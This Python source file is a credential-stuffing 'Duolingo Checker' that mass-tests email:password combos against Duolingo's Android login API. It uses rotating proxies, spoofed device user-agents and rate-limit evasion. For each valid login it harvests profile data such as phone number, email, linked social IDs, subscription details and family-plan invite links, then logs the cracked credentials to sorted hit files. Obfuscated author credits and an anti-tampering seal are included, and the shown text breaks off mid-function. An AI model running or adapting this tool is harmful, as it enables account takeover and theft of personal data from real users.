import os, re, sys, json, time, base64, random, string, hashlib, uuid
import threading, configparser, urllib3, urllib.parse
from datetime import datetime
from concurrent.futures import (ThreadPoolExecutor, as_completed,
                                 wait, FIRST_COMPLETED)

try:
    from curl_cffi import requests as eyelifter_cffi
    _EYELIFTER_HAVE_CFFI = True
except ImportError:
    import requests as eyelifter_cffi
    _EYELIFTER_HAVE_CFFI = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_F1T = "RHVvbGluZ28="
_F2T = "IENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "RFVPTElOR09AZXllbGlmdGVy"
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

_EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.duolingo.seal")
_EYELIFTER_SEALED = None

EYELIFTER_LOGIN_URL = "https://android-api-cf.duolingo.com/2017-06-30/login?fields=id"
EYELIFTER_USER_BASE = "https://android-api-cf.duolingo.com/2023-05-23/users"

EYELIFTER_UA_LOGIN = ("Duodroid/5.141.7 Dalvik/2.1.0 "
                      "(Linux; U; Android 9; SM-G955N Build/NRD90M.G955NKSU1AQDC)")
EYELIFTER_UA_PROFILE = ("Duodroid/5.128.3 Dalvik/2.1.0 "
                        "(Linux; U; Android 9; SM-G988N Build/PD1A.180720.030)")

EYELIFTER_DISTINCT_ID = "d4069030-e66a-4b56-b6a3-33df50c13c92"

EYELIFTER_PROFILE_FIELDS = ",".join([
    "id", "username", "name", "email", "picture",
    "creationDate", "streak", "totalXp", "lingots", "gemsConfig",
    "currentCourseId", "learningLanguage", "fromLanguage",
    "hasPlus", "hasGoogleId", "hasFacebookId", "googleId", "facebookId",
    "phoneNumber", "location", "timezone", "bio",
    "has_item_premium_subscription",
    "has_item_gold_subscription",
    "has_item_immersive_subscription",
    "has_item_live_subscription",
    "subscriptionConfigs", "shopItems", "streakData",
    "referralInfo", "plusDiscounts", "inviteToken", "courses",
    "health", "roles", "optionalFeatures",
])


def eyelifter_d(e):
    pad = "=" * (-len(e) % 4)
    return base64.b64decode(e + pad).decode("utf-8")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)


EYELIFTER_TOOL     = eyelifter_j(_F1T, _F2T)
EYELIFTER_TG_USER  = eyelifter_j(_F1A, _F2A)
EYELIFTER_TG_CHAN  = eyelifter_j(_F1C, _F2C)
EYELIFTER_RESULTS  = eyelifter_j(_F1D)
EYELIFTER_SEAL_STR = eyelifter_j(_F1S, _F2S)
EYELIFTER_LINE_TAG = f"by {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}"


def eyelifter_verify(ctx="x"):
    global _EYELIFTER_SEALED
    if _EYELIFTER_SEALED is True:
        return True
    if EYELIFTER_TOOL != "Duolingo Checker":
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_TG_USER != "@samvir1" or EYELIFTER_TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_RESULTS != "DUOLINGO@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_SEAL_STR != "locked-by-eyelifter-2026":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(_EYELIFTER_SEAL):
        try:
            st = open(_EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: hands off. this build is sealed.")
    else:
        try:
            open(_EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _EYELIFTER_SEALED = True
    return True


_EYELIFTER_ANSI = sys.stdout.isatty()
_EYELIFTER_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _EYELIFTER_ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_EYELIFTER_RS}"


_EYELIFTER_LV = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

_EYELIFTER_KIND_COLOR = {
    "premium": ("92", True),
    "family":  ("95", True),
    "free":    ("96", False),
    "bad":     ("31", False),
    "error":   ("31", True),
}

_EYELIFTER_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _EYELIFTER_LV.get(level, ("0", False))
    with _EYELIFTER_CL:
        if _EYELIFTER_ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_dbg(tag, msg):
    if not _EYELIFTER_CFG.s.get("debug", False):
        return
    eyelifter_log("🐛", "DEBUG", tag, msg)


def eyelifter_rline(i, t, kind, txt):
    code, bold = _EYELIFTER_KIND_COLOR.get(kind, ("0", False))
    with _EYELIFTER_CL:
        if _EYELIFTER_ANSI:
            prefix = eyelifter_color("90", f"[{i:02d}/{t}]")
            body = eyelifter_color(code, txt, bold)
            print(f"{prefix} {body}", flush=True)
        else:
            print(f"[{i:02d}/{t}] {txt}", flush=True)


def eyelifter_section(t, w=68):
    print()
    lbl = f" {t} "
    side = max(1, (w - len(lbl)) // 2)
    print(eyelifter_color("90", "─" * side) + eyelifter_color("96", lbl, True)
          + eyelifter_color("90", "─" * (w - len(lbl) - side)))


def eyelifter_banner(t, sub=None, w=68):
    print()
    line = "═" if _EYELIFTER_ANSI else "="
    print(eyelifter_color("90", line * w))
    print(eyelifter_color("96", t.center(w), True))
    if sub:
        print(eyelifter_color("2", sub.center(w)))
    print(eyelifter_color("5",
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}".center(w)))
    print(eyelifter_color("90", line * w))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96",
        f"═══ eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} ═══", True))
    if rows:
        wk = max(len(str(k)) for k, _ in rows)
        for k, v in rows:
            print(f"  {eyelifter_color('96', str(k).ljust(wk))}  "
                  f"{eyelifter_color('0', str(v))}")
    print(eyelifter_color("96", "════════════════════════════════", True))


def eyelifter_human_ts(ts):
    if not ts:
        return None
    try:
        n = int(ts)
        if n > 10 ** 12:
            n //= 1000
        return datetime.fromtimestamp(n).astimezone().strftime(
            "%b %d, %Y · %H:%M")
    except Exception:
        return str(ts)


def eyelifter_human_time_long(iso=None):
    try:
        if iso is None:
            dt = datetime.now().astimezone()
        elif isinstance(iso, datetime):
            dt = iso.astimezone() if iso.tzinfo else iso
        else:
            s = str(iso).strip().replace("Z", "+00:00")
            dt = datetime.fromisoformat(s).astimezone()
        return dt.strftime("%B %d, %Y · %H:%M:%S")
    except Exception:
        return str(iso)


def eyelifter_fmt_price(price, currency):
    if price is None or price == "":
        return "-"
    try:
        p = float(price)
    except (ValueError, TypeError):
        return str(price)
    if p >= 1000:
        p = p / 100.0
    cur = (currency or "").strip().upper()
    if cur:
        return f"{p:.2f} {cur}"
    return f"{p:.2f}"


_EYELIFTER_CFG_PATH = os.path.join(
    os.environ.get("DUO_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_duolingo.ini"
)
_EYELIFTER_MAX_THREADS = 200


class EyelifterCfg:
    def __init__(self, cf=_EYELIFTER_CFG_PATH):
        self.cf = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.s = self.eyelifter_inmemory()
        try:
            self.eyelifter_load()
        except Exception as e:
            sys.stderr.write(f"[duolingo] config load failed, using defaults: {e}\n")

    @staticmethod
    def eyelifter_inmemory():
        return {
            "threads": 10,
            "timeout": 30,
            "proxies_file": "proxies.txt",
            "retries": 2,
            "retry_delay": 1.5,
            "combo_delay": 0.3,
            "rate_limit_delay": 60,
            "skip_proxy_test": False,
            "open_channel_on_launch": True,
            "debug": False,
            "hit_spacer": True,
            "impersonate": "chrome",
            "deep_enrich": True,
        }

    def eyelifter_load(self):
        if not os.path.exists(self.cf):
            try:
                self.eyelifter_default()
            except Exception:
                pass
        try:
            self.cp.read(self.cf, encoding="utf-8")
        except Exception:
            try:
                self.eyelifter_default()
                self.cp.read(self.cf, encoding="utf-8")
            except Exception:
                return
        if "duolingo" not in self.cp:
            self.cp["duolingo"] = {}
        c = self.cp["duolingo"]
        try:
            self.s["threads"] = max(1, min(_EYELIFTER_MAX_THREADS,
                c.getint("threads", 10)))
        except (ValueError, TypeError):
            self.s["threads"] = 10
        try:
            self.s["timeout"] = max(5, min(120, c.getint("timeout", 30)))
        except (ValueError, TypeError):
            self.s["timeout"] = 30
        self.s["proxies_file"] = c.get("proxies_file", "proxies.txt")
        try:
            self.s["retries"] = max(0, min(5, c.getint("retries", 2)))
        except (ValueError, TypeError):
            self.s["retries"] = 2
        try:
            self.s["retry_delay"] = max(0.0, min(60.0,
                c.getfloat("retry_delay", 1.5)))
        except (ValueError, TypeError):
            self.s["retry_delay"] = 1.5
        try:
            self.s["combo_delay"] = max(0.0, min(60.0,
                c.getfloat("combo_delay", 0.3)))
        except (ValueError, TypeError):
            self.s["combo_delay"] = 0.3
        try:
            self.s["rate_limit_delay"] = max(1, min(300,
                c.getint("rate_limit_delay", 60)))
        except (ValueError, TypeError):
            self.s["rate_limit_delay"] = 60
        self.s["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.s["open_channel_on_launch"] = c.getboolean(
            "open_channel_on_launch", True)
        self.s["debug"] = c.getboolean("debug", False)
        self.s["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.s["impersonate"] = c.get("impersonate", "chrome")
        self.s["deep_enrich"] = c.getboolean("deep_enrich", True)

    def eyelifter_default(self):
        self.cp["duolingo"] = {
            "threads": "10", "timeout": "30", "proxies_file": "proxies.txt",
            "retries": "2", "retry_delay": "1.5", "combo_delay": "0.3",
            "rate_limit_delay": "60", "skip_proxy_test": "false",
            "open_channel_on_launch": "true", "debug": "false",
            "hit_spacer": "true", "impersonate": "chrome",
            "deep_enrich": "true",
        }
        try:
            with open(self.cf, "w", encoding="utf-8") as f:
                self.cp.write(f)
        except OSError:
            pass

    def eyelifter_save(self):
        if "duolingo" not in self.cp:
            self.cp["duolingo"] = {}
        for k, v in self.s.items():
            self.cp["duolingo"][k] = str(v)
        with open(self.cf, "w", encoding="utf-8") as f:
            self.cp.write(f)


_EYELIFTER_CFG = EyelifterCfg()

_EYELIFTER_LK = threading.Lock()
_EYELIFTER_PK = threading.Lock()
_EYELIFTER_FK = threading.Lock()
_EYELIFTER_IK = threading.Lock()
_EYELIFTER_RL = threading.Lock()
_EYELIFTER_DBG_LOCK = threading.Lock()
_EYELIFTER_STOP = threading.Event()

_EYELIFTER_ST = {"checked": 0, "premium": 0, "family": 0, "free": 0, "bad": 0,
                 "rl": 0, "errors": 0, "pfails": 0}
_EYELIFTER_START = time.time()
_EYELIFTER_TOTAL = 0
_EYELIFTER_POOL = []
_EYELIFTER_BADP = set()
_EYELIFTER_COOLP = {}
_EYELIFTER_INUSE = set()
_EYELIFTER_RLU = {}
_EYELIFTER_FOLDER = None
_EYELIFTER_DBG_DIR = None
_EYELIFTER_HANDLES = {}


def eyelifter_reset_stats():
    global _EYELIFTER_ST, _EYELIFTER_START, _EYELIFTER_COOLP
    global _EYELIFTER_BADP, _EYELIFTER_RLU
    with _EYELIFTER_LK:
        _EYELIFTER_ST = {"checked": 0, "premium": 0, "family": 0, "free": 0,
                         "bad": 0, "rl": 0, "errors": 0, "pfails": 0}
        _EYELIFTER_START = time.time()
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP = {}
        _EYELIFTER_BADP = set()
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = {}
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.clear()


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with _EYELIFTER_PK:
        avail = [p for p in _EYELIFTER_POOL
                 if p not in _EYELIFTER_BADP
                 and _EYELIFTER_COOLP.get(p, 0.0) <= now]
    with _EYELIFTER_IK:
        free = [p for p in avail if p not in _EYELIFTER_INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _EYELIFTER_IK:
            _EYELIFTER_INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    with _EYELIFTER_PK:
        if p in _EYELIFTER_BADP:
            return
        _EYELIFTER_BADP.add(p)
    with _EYELIFTER_LK:
        _EYELIFTER_ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120):
    if not p:
        return
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP[p] = time.time() + secs


def eyelifter_rl_backoff(s, proxy=None):
    key = proxy or "__direct__"
    with _EYELIFTER_RL:
        _EYELIFTER_RLU[key] = max(
            _EYELIFTER_RLU.get(key, 0.0), time.time() + s)


def eyelifter_rl_wait(proxy=None):
    key = proxy or "__direct__"
    while not _EYELIFTER_STOP.is_set():
        with _EYELIFTER_RL:
            gap = _EYELIFTER_RLU.get(key, 0.0) - time.time()
        if gap <= 0:
            with _EYELIFTER_RL:
                _EYELIFTER_RLU.pop(key, None)
            return
        if _EYELIFTER_STOP.wait(min(gap, 1.0)):
            return


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _EYELIFTER_FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def eyelifter_parse_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    p = line.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    if "@" in line:
        return f"http://{line}"
    return None


def eyelifter_load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = eyelifter_parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def eyelifter_build_session(proxy=None):
    to = _EYELIFTER_CFG.s["timeout"]
    s = None
    if _EYELIFTER_HAVE_CFFI:
        try:
            s = eyelifter_cffi.Session(impersonate=_EYELIFTER_CFG.s["impersonate"], timeout=to)
        except Exception:
            try:
                s = eyelifter_cffi.Session(impersonate="chrome", timeout=to)
            except Exception:
                s = eyelifter_cffi.Session(timeout=to)
    else:
        s = eyelifter_cffi.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def eyelifter_test_proxy(p):
    try:
        kw = {"proxies": {"http": p, "https": p}, "timeout": 8}
        if _EYELIFTER_HAVE_CFFI:
            kw["impersonate"] = "chrome"
        kw["verify"] = False
        r = eyelifter_cffi.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good, done = [], [0]
    lock = threading.Lock()
    eyelifter_log("🌐", "STEP", "PROXY", f"testing {total}")

    def probe(p):
        ok = eyelifter_test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                good.append(p)
            if done[0] % 20 == 0 or done[0] == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"{done[0]}/{total} — {len(good)} live")

    with ThreadPoolExecutor(max_workers=min(60, max(1, total))) as ex:
        for f in as_completed([ex.submit(probe, p) for p in proxies]):
            try:
                f.result()
            except Exception:
                pass
    if not good:
        eyelifter_log("⚠️", "WARN", "PROXY", f"0/{total} live — running direct")
        return []
    eyelifter_log("✅", "INFO", "PROXY", f"{len(good)}/{total} live")
    return good


def eyelifter_folder():
    global _EYELIFTER_FOLDER, _EYELIFTER_DBG_DIR
    if _EYELIFTER_FOLDER:
        return _EYELIFTER_FOLDER
    root = os.path.join(os.path.dirname(_EYELIFTER_CFG_PATH), EYELIFTER_RESULTS)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _EYELIFTER_FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)
    _EYELIFTER_DBG_DIR = os.path.join(_EYELIFTER_FOLDER, "Debug")
    os.makedirs(_EYELIFTER_DBG_DIR, exist_ok=True)
    return _EYELIFTER_FOLDER


def eyelifter_save_dbg(name, text):
    if not _EYELIFTER_CFG.s.get("debug", False):
        return
    eyelifter_folder()
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:150]
    with _EYELIFTER_DBG_LOCK:
        try:
            with open(os.path.join(_EYELIFTER_DBG_DIR, f"{safe}.txt"), "w",
                      encoding="utf-8", errors="replace") as f:
                f.write((text or "")[:500_000])
        except Exception:
            pass


class EyelifterResult:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.status = "unknown"
        self.reason = ""
        self.uid = None
        self.username = None
        self.name = None
        self.email_actual = None
        self.picture = None
        self.streak = 0
        self.total_xp = 0
        self.lingots = 0
        self.gems = 0
        self.learning_language = None
        self.from_language = None
        self.current_course = None
        self.creation_ts = None
        self.timezone = None
        self.location = None
        self.phone = None
        self.bio = ""
        self.has_plus = False
        self.has_google = False
        self.has_facebook = False
        self.google_id = None
        self.facebook_id = None
        self.subscriptions = []
        self.subscription_configs = []
        self.shop_items = []
        self.plus_discounts = []
        self.invite_token = None
        self.referral_info = {}
        self.streak_data = {}
        self.course_count = 0
        self.is_premium = False
        self.is_family = False
        self.family_seats = 0
        self.family_owner = None
        self.plan_label = None
        self.plan_tier = None
        self.plan_type = None
        self.plan_renewer = None
        self.price = None
        self.currency = None
        self.expires = None
        self.renewing = None
        self.raw = None


def eyelifter_check(combo, proxy=None):
    if ":" not in combo:
        r = EyelifterResult(combo, "")
        r.status = "bad"
        r.reason = "malformed"
        return r
    email, password = combo.split(":", 1)
    email = email.strip().lower()
    password = password.strip()
    r = EyelifterResult(email, password)

    eyelifter_dbg("CHECK", f"start · {email} · proxy={proxy or 'direct'}")

    s = eyelifter_build_session(proxy)
    try:
        body = {
            "distinctId": EYELIFTER_DISTINCT_ID,
            "identifier": email,
            "password": password,
        }
        headers = {
            "Host": "android-api-cf.duolingo.com",
            "user-agent": EYELIFTER_UA_LOGIN,
            "accept": "application/json",
            "x-amzn-trace-id": "User=0",
            "content-type": "application/json",
        }

        try:
            lr = s.post(EYELIFTER_LOGIN_URL, json=body, headers=headers,
                        timeout=_EYELIFTER_CFG.s["timeout"])
        except Exception as e:
            r.status = "error"
            r.reason = f"net_{type(e).__name__}"
            eyelifter_dbg("CHECK", f"login net err · {type(e).__name__}")
            return r

        eyelifter_save_dbg(f"login_{email}", lr.text)
        eyelifter_dbg("CHECK", f"login http={lr.status_code}")

        if lr.status_code == 429:
            r.status = "error"
            r.reason = "rate_limit"
            return r
        if lr.status_code == 401:
            r.status = "bad"
            r.reason = "wrong_creds"
            return r
        if lr.status_code != 200:
            r.status = "error"
            r.reason = f"login_{lr.status_code}"
            return r

        try:
            lj = lr.json()
        except Exception:
            r.status = "error"
            r.reason = "login_non_json"
            return r
        uid = lj.get("id")
        if not uid:
            r.status = "error"
            r.reason = "no_uid"
            return r
        r.uid = uid

        jwt = lr.headers.get("jwt", "")
        if not jwt:
            r.status = "error"
            r.reason = "no_jwt"
            return r
        eyelifter_dbg("CHECK", f"uid={uid} jwt_len={len(jwt)}")

        qs = urllib.parse.quote(EYELIFTER_PROFILE_FIELDS, safe="")
        url = f"{EYELIFTER_USER_BASE}/{uid}?fields={qs}"
        ph = {
            "Host": "android-api-cf.duolingo.com",
            "authorization": f"Bearer {jwt}",
            "x-amzn-trace-id": f"User={uid}",
            "user-agent": EYELIFTER_UA_PROFILE,
            "accept": "application/json",
        }
        try:
            pr = s.get(url, headers=ph, timeout=_EYELIFTER_CFG.s["timeout"])
        except Exception as e:
            r.status = "error"
            r.reason = f"net_{type(e).__name__}"
            eyelifter_dbg("CHECK", f"profile net err · {type(e).__name__}")
            return r

        eyelifter_save_dbg(f"profile_{email}", pr.text)
        eyelifter_dbg("CHECK", f"profile http={pr.status_code} len={len(pr.text)}")

        if pr.status_code == 429:
            r.status = "error"
            r.reason = "rate_limit"
            return r
        if pr.status_code == 401:
            r.status = "error"
            r.reason = "profile_token_rejected"
            return r
        if pr.status_code != 200:
            r.status = "error"
            r.reason = f"profile_{pr.status_code}"
            return r

        try:
            p = pr.json()
        except Exception:
            r.status = "error"
            r.reason = "profile_non_json"
            return r

        r.raw = p
        r.username = p.get("username")
        r.name = p.get("name")
        r.email_actual = p.get("email")
        r.picture = p.get("picture")
        r.streak = p.get("streak") or 0
        r.total_xp = p.get("totalXp") or 0
        r.lingots = p.get("lingots") or 0
        gems = (p.get("gemsConfig") or {})
        r.gems = gems.get("gems") or 0
        r.learning_language = p.get("learningLanguage")
        r.from_language = p.get("fromLanguage")
        r.current_course = p.get("currentCourseId")
        r.creation_ts = p.get("creationDate")
        r.timezone = p.get("timezone")
        r.location = p.get("location")
        r.phone = p.get("phoneNumber")
        r.bio = p.get("bio") or ""
        r.has_plus = bool(p.get("hasPlus"))
        r.has_google = bool(p.get("hasGoogleId"))
        r.has_facebook = bool(p.get("hasFacebookId"))
        r.google_id = p.get("googleId")
        r.facebook_id = p.get("facebookId")
        r.subscription_configs = p.get("subscriptionConfigs") or []
        r.shop_items = p.get("shopItems") or []
        r.plus_discounts = p.get("plusDiscounts") or []
        r.referral_info = p.get("referralInfo") or {}
        r.streak_data = p.get("streakData") or {}
        r.course_count = len(p.get("courses") or [])
        r.invite_token = (p.get("inviteToken")
                          or r.referral_info.get("inviteToken"))

        subs = []
        family_info = None
        for item in r.shop_items:
            if item.get("id") != "premium_subscription":
                continue
            si = item.get("subscriptionInfo") or {}
            if not si:
                continue
            subs.append({
                "product": si.get("productId"),
                "tier": si.get("tier"),
                "type": si.get("type"),
                "renewing": si.get("renewing"),
                "renewer": si.get("renewer"),
                "expected": si.get("expectedExpiration"),
                "price": si.get("price"),
                "currency": si.get("currency"),
                "free_trial": si.get("isFreeTrialPeriod"),
                "first_payment": si.get("firstPaymentDate"),
                "period_months": si.get("periodLength"),
            })
            if si.get("expectedExpiration"):
                r.expires = si.get("expectedExpiration")
            if si.get("renewing") is not None:
                r.renewing = si.get("renewing")
            if item.get("familyPlanInfo"):
                family_info = item["familyPlanInfo"]

        for sc in (r.subscription_configs or []):
            exp_ms = sc.get("expirationTimestamp")
            if exp_ms and (not r.expires or exp_ms // 1000 > r.expires):
                r.expires = exp_ms // 1000
                r.renewing = (not bool(sc.get("isInGracePeriod"))
                              and not bool(sc.get("isInBillingRetryPeriod")))

        r.subscriptions = subs
        r.is_premium = bool(r.has_plus or subs)

        if family_info:
            r.is_family = True
            members = family_info.get("secondaryMembers") or []
            r.family_seats = len(members)
            r.family_owner = family_info.get("ownerId")
            r.plan_label = f"Family ({r.family_seats} seats)"
        elif subs:
            s0 = subs[0]
            tier = (s0.get("tier") or "").replace("_", " ").title()
            r.plan_tier = s0.get("tier")
            r.plan_type = s0.get("type")
            r.plan_renewer = s0.get("renewer")
            r.price = s0.get("price")
            r.currency = s0.get("currency")
            if s0.get("type") == "premium":
                r.plan_label = f"Super ({tier})" if tier else "Super Duolingo"
            else:
                r.plan_label = f"{s0.get('product')} ({tier})" if tier else s0.get("product")
        elif r.has_plus:
            r.plan_label = "Super Duolingo"

        eyelifter_dbg("CHECK",
            f"uid={uid} plan={r.plan_label} premium={r.is_premium} "
            f"family={r.is_family} subs={len(subs)}")

        r.status = "hit"
        return r
    finally:
        try:
            s.close()
        except Exception:
            pass


def eyelifter_classify(r):
    if r.status == "bad":
        return "bad"
    if r.status != "hit":
        return "error"
    if r.is_family:
        return "family"
    if r.is_premium:
        return "premium"
    return "free"


def eyelifter_open_files(d):
    hdr = (
        f"# Duolingo Checker by eyelifter — started {eyelifter_human_time_long()}\n"
        f"# Credit: eyelifter | {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}\n"
        f"# Seal: {EYELIFTER_SEAL_STR}\n"
        f"\n"
    )
    names = {
        "premium": "duolingo_premium.txt",
        "family":  "duolingo_family.txt",
        "free":    "duolingo_free.txt",
        "bad":     "duolingo_bad.txt",
        "error":   "duolingo_errors.txt",
        "json":    "duolingo_hits_full.jsonl",
    }
    handles = {}
    for k, n in names.items():
        fh = open(os.path.join(d, n), "w", encoding="utf-8")
        if k != "json":
            fh.write(hdr)
        handles[k] = fh
    return handles


def eyelifter_fmt_line(r):
    def _v(x):
        if x is None or x == "":
            return "-"
        return str(x)

    expires_h = eyelifter_human_ts(r.expires)
    price_s = eyelifter_fmt_price(r.price, r.currency)

    parts = [
        f"{r.email}:{r.password}",
        f"uid={_v(r.uid)}",
        f"user={_v(r.username)}",
        f"name={_v(r.name)}",
        f"plan={_v(r.plan_label)}",
        f"plus={_v(r.has_plus)}",
        f"streak={r.streak}",
        f"xp={r.total_xp}",
        f"lingots={r.lingots}",
        f"gems={r.gems}",
        f"learn={_v(r.learning_language)}",
        f"from={_v(r.from_language)}",
        f"tz={_v(r.timezone)}",
        f"phone={_v(r.phone)}",
        f"created={_v(eyelifter_human_ts(r.creation_ts))}",
        f"renewing={_v(r.renewing)}",
        f"expires={_v(expires_h)}",
        f"price={_v(price_s)}",
        f"invite={_v(r.invite_token)}",
        f"google={_v(r.has_google)}",
        f"fb={_v(r.has_facebook)}",
    ]
    return " | ".join(parts) + f" | {EYELIFTER_LINE_TAG}"


def eyelifter_short_line(r, kind):
    cc = f"{r.email}:{r.password}"
    if kind == "premium":
        return (f"{cc} | PREMIUM | {r.plan_label or 'Super'} | "
                f"uid={r.uid} | user={r.username or '-'}")
    if kind == "family":
        inv = ""
        if r.invite_token:
            inv = f" · https://invite.duolingo.com/family-plan/{r.invite_token}"
        return (f"{cc} | FAMILY | {r.plan_label or 'Family'}{inv} | "
                f"uid={r.uid} | user={r.username or '-'}")
    if kind == "free":
        return (f"{cc} | FREE | uid={r.uid} | "
                f"user={r.username or '-'} | xp={r.total_xp}")
    if kind == "bad":
        return f"{cc} | bad | {r.reason or 'wrong_creds'}"
    return f"{cc} | err | {eyelifter_readable_reason(r.reason)}"


def eyelifter_readable_reason(reason):
    if not reason:
        return "unknown"
    r = str(reason)
    if r.startswith("net_"):
        return f"network({r[4:].lower()})"
    if r.startswith("login_"):
        return f"login({r[6:].lower()})"
    if r.startswith("profile_"):
        return f"profile({r[8:].lower()})"
    return r


def eyelifter_record(r):
    kind = eyelifter_classify(r)
    with _EYELIFTER_LK:
        _EYELIFTER_ST["checked"] += 1
        done = _EYELIFTER_ST["checked"]
        if kind in _EYELIFTER_ST:
            _EYELIFTER_ST[kind] += 1
        else:
            _EYELIFTER_ST["errors"] += 1
        total = _EYELIFTER_TOTAL

    sp = "\n\n" if _EYELIFTER_CFG.s.get("hit_spacer", True) else "\n"

    eyelifter_dbg("RECORD", f"{r.email} → {kind}")

    if kind in ("premium", "family", "free"):
        line = eyelifter_fmt_line(r)
        eyelifter_rline(done, total, kind, eyelifter_short_line(r, kind))
        eyelifter_sw(_EYELIFTER_HANDLES[kind], line + sp)
        if kind in ("premium", "family"):
            try:
                eyelifter_sw(_EYELIFTER_HANDLES["json"], json.dumps({
                    "email": r.email, "password": r.password,
                    "uid": r.uid, "username": r.username,
                    "name": r.name, "email_actual": r.email_actual,
                    "plan_label": r.plan_label,
                    "plan_tier": r.plan_tier,
                    "plan_type": r.plan_type,
                    "plan_renewer": r.plan_renewer,
                    "is_premium": r.is_premium,
                    "is_family": r.is_family,
                    "family_seats": r.family_seats,
                    "family_owner": r.family_owner,
                    "has_plus": r.has_plus,
                    "subscriptions": r.subscriptions,
                    "subscription_configs": r.subscription_configs,
                    "plus_discounts": r.plus_discounts,
                    "invite_token": r.invite_token,
                    "renewing": r.renewing,
                    "expires": r.expires,
                    "expires_human": eyelifter_human_ts(r.expires),
                    "price": r.price,
                    "currency": r.currency,
                    "price_display": eyelifter_fmt_price(r.price, r.currency),
                    "streak": r.streak,
                    "total_xp": r.total_xp,
                    "lingots": r.lingots,
                    "gems": r.gems,
                    "learning_language": r.learning_language,
                    "from_language": r.from_language,
                    "timezone": r.timezone,
                    "phone": r.phone,
                    "creation_ts": r.creation_ts,
                    "has_google": r.has_google,
                    "has_facebook": r.has_facebook,
                    "kind": kind,
                }, ensure_ascii=False) + "\n")
            except Exception:
                pass
        return

    if kind == "bad":
        eyelifter_rline(done, total, "bad", eyelifter_short_line(r, kind))
        eyelifter_sw(_EYELIFTER_HANDLES["bad"],
                     f"{r.email}:{r.password} | {r.reason or 'bad'} | "
                     f"{EYELIFTER_LINE_TAG}{sp}")
        return

    eyelifter_rline(done, total, "error", eyelifter_short_line(r, kind))
    eyelifter_sw(_EYELIFTER_HANDLES["error"],
                 f"{r.email}:{r.password} | "
                 f"{eyelifter_readable_reason(r.reason)} | "
                 f"{EYELIFTER_LINE_TAG}{sp}")


def eyelifter_run_one(combo):
    if _EYELIFTER_STOP.is_set():
        return
    gap = _EYELIFTER_CFG.s.get("combo_delay", 0.3)
    if gap > 0 and _EYELIFTER_STOP.wait(gap * (0.5 + random.random())):
        return
    eyelifter_rl_wait()
    if _EYELIFTER_STOP.is_set():
        return

    proxy = eyelifter_pick_proxy() if _EYELIFTER_POOL else None
